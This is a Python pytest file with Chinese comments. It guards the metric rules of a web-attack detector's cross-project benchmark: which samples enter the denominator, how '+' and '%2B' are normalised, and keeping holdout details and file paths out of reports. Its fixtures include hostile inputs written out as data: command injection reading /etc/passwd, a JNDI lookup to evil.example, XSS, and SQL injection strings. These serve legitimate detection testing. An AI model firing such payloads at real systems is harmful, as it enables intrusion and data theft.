"""跨项目交叉评测（`bench/run_crosscheck.py`）的口径守卫。

这个脚本的数字会写进 README 和面试材料，所以**口径比功能更重要**：
分母里放什么、什么不算漏检、哪些明细不能公开、哪个缺口是已知的——
每一条都可能被「顺手改一下」改坏，而且改坏之后数字看起来依然合理。
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from bench import run_crosscheck as cc  # noqa: E402


def _corpus(tmp_path: Path, cases: list[dict]) -> Path:
    p = tmp_path / "corpus.json"
    p.write_text(json.dumps({"source": "test", "cases": cases}, ensure_ascii=False),
                 encoding="utf-8")
    return p


def _case(**kw) -> dict:
    base = {
        "id": "T-001", "set": "corpus", "category": "sqli", "name": "case",
        "is_attack": True, "method": "GET", "path": "/", "query": "", "body": "",
        "ua": "", "headers": {},
    }
    base.update(kw)
    return base


# ---------------------------------------------------------------- 分母口径


def test_unsupported_categories_excluded_from_denominator(tmp_path):
    """没有 RCE 规则时，RCE 样本不能算成「检出率 0%」——它根本不在分母里。"""
    p = _corpus(tmp_path, [
        _case(id="R-1", category="rce", query="cmd=;cat+/etc/passwd"),
        _case(id="R-2", category="rce", query="cmd=|whoami"),
    ])
    res = cc.evaluate(p)
    assert res.supported_attacks == 0, "RCE 不在检测范围，不该进分母"
    assert res.unsupported_attacks == 2
    assert res.recall == 0.0, "分母为 0 时返回 0.0，不能抛除零异常"
    assert res.cats["rce"].supported is False


def test_scanner_is_attack_not_benign(tmp_path):
    """bypasslab 的 scanner 类是 8 条**攻击**样本（sqlmap/Nikto UA 指纹，IsAttack=true）。
    把它当良性样本会让「范围外攻击数」少算 8 条。"""
    p = _corpus(tmp_path, [
        _case(id="SC-1", category="scanner", name="UA 指纹", ua="sqlmap/1.7.2#stable"),
    ])
    res = cc.evaluate(p)
    assert res.cats["scanner"].supported is False
    assert res.cats["scanner"].attacks == 1
    assert res.unsupported_attacks == 1


def test_negative_sample_hit_counts_as_false_positive(tmp_path):
    """良性样本被命中必须记误报，不能因为「数据集没有攻击窗」就略过。"""
    p = _corpus(tmp_path, [
        _case(id="B-1", category="benign", name="良性但含 script", is_attack=False,
              path="/comment", query="c=%3Cscript%3Ealert(1)%3C/script%3E"),
    ])
    res = cc.evaluate(p)
    assert res.false_positives == 1
    assert res.fp_total == 1
    assert res.benign_total == 1


# ---------------------------------------------------------------- 事件构造


def test_user_agent_payload_reaches_rule(tmp_path):
    """JNDI 载荷可能**只**放在 User-Agent 里（bypasslab 的 W2-DESER-1..5 就是）。
    事件构造必须把 UA 拼进 raw，否则会制造假漏检。"""
    case = _case(id="U-1", category="deserialization", name="UA JNDI",
                 ua="${jndi:ldap://evil.example/a}")
    ev = cc.build_event(case, 0)
    assert "jndi:ldap" in ev.raw.lower(), "UA 必须进入 raw，否则规则看不到"
    assert "jndi:ldap" in ev.normalized

    res = cc.evaluate(_corpus(tmp_path, [case]))
    assert res.cats["deserialization"].detected == 1


def test_form_plus_is_decoded_so_encoded_attacks_hit(tmp_path):
    """v1.9：form 编码里的 `+` 必须按空格还原，否则整类载荷直接绕过。

    v1.8 首次跑本评测时，这一格是**漏检**：`id=1+UNION+SELECT+...` 归一化后
    仍是 `1+union+select`，规则里的 `union select` 匹配不到——49.6% 里有一块
    就是这个缺口。当时只做了 what-if 量化（→55.6%）没修，因为改归一化会动到
    已发布的 CIC 全部指标。v1.9 带着三份全量回归把它修了，本测试是那条修复的守卫。

    如果这条测试失败，说明 `_judgement_text()` 里的 `+` 处理被改坏了，
    交叉评测的检出率会立刻掉回 49.6% 附近。
    """
    p = _corpus(tmp_path, [
        _case(id="S-1", category="sqli", name="form 编码 union",
              path="/product", query="id=1+UNION+SELECT+username+FROM+users"),
    ])
    res = cc.evaluate(p)
    assert res.supported_detected == 1, "form 编码的 union select 必须命中"
    assert res.miss_total == 0


def test_literal_plus_is_not_turned_into_space(tmp_path):
    """`%2B` 是字面加号，不是空格。顺序错了就会把它也换掉。

    正确顺序是「先在原文上换 `+`→空格，再 unquote」；
    反过来写（先 unquote 再换）会把 `%2B` 解码出的 `+` 也吃掉，
    于是 `a%2Bb` 变成 `a b`——那是伪造语义，不是归一化。
    这里用一条只可能因 `%2B` 被误伤才命中的样本反向验证：
    `id=1+and+2%2B3=5` 归一化后应是 `1 and 2+3=5`，仍带加号。
    """
    case = _case(id="S-2", category="sqli", name="literal plus",
                 path="/p", query="id=1+and+2%2B3=5")
    ev = cc.build_event(case, 0)
    assert "2+3=5" in ev.normalized, "字面加号必须保留"
    assert "1 and 2+3" in ev.normalized, "query 里的 + 要变成空格"


def test_plus_in_path_is_left_alone(tmp_path):
    """path 里的 `+` 是字面字符，不能换成空格（只动 query 与 form body）。"""
    case = _case(id="S-3", category="sqli", name="path plus",
                 path="/a+b/c", query="q=1+2")
    ev = cc.build_event(case, 0)
    assert "/a+b/c" in ev.normalized, "path 里的 + 不能被吃掉"
    assert "q=1 2" in ev.normalized


# ---------------------------------------------------------------- 报告纪律


def test_holdout_misses_are_not_listed(tmp_path):
    """冻结语料只进总数、不进明细——否则会破坏 bypasslab 的泛化测试机制。

    样本必须用**仍然漏检**的形态：v1.9 修掉 `+` 解码后，`id=1+UNION+SELECT+1`
    已经能被抓到了，继续用它会让这条测试退化成「零漏检时断言漏检列表」。
    这里改用无引号恒真式（规则只认带引号的 `' or '1'='1`），它对两类语料都漏。
    """
    cases = [
        _case(id="Holdout-SQLI-99", set="holdout", category="sqli",
              query="id=1234+OR+1=1"),
        _case(id="W2-SQLI-99", set="corpus", category="sqli",
              query="id=1234+OR+1=1"),
    ]
    res = cc.evaluate(_corpus(tmp_path, cases))
    listed = {r.case["id"] for r in res.miss_samples}
    assert "W2-SQLI-99" in listed
    assert "Holdout-SQLI-99" not in listed, "holdout 明细不得公开"
    assert res.holdout_attacks == 1
    assert res.miss_total == 2, "总数可以报，明细不行"


def test_report_has_no_absolute_paths(tmp_path):
    """报告会提交进公开仓库，不能把开发机目录写进去。

    这条测试在 Linux CI 上红过一次：当时语料路径用 `os.path.relpath` 生成，
    POSIX 上返回 `../../../../tmp/pytest-.../corpus.json`——字符串里**仍然包含**
    `/tmp/pytest-...`，断言 `str(tmp_path) not in text` 就挂了；而 Windows 跨盘符
    会抛 `ValueError` 走 `Path.name` 兜底，所以本地一直是绿的。

    修法是报告里固定只写文件名，并且把「相对路径逃逸」也一起断言掉——
    只查绝对路径抓不住 `../../tmp/...` 这种形态。
    """
    p = _corpus(tmp_path, [_case(id="S-2", category="sqli", query="id=1")])
    text = cc.render(cc.evaluate(p))
    assert str(tmp_path) not in text
    assert "../" not in text, "相对路径逃逸同样会泄露 /tmp/... 片段"
    assert "C:\\" not in text
    assert "D:\\" not in text
    assert "corpus.json" in text, "文件名仍要保留，否则读者不知道评测的是哪份语料"
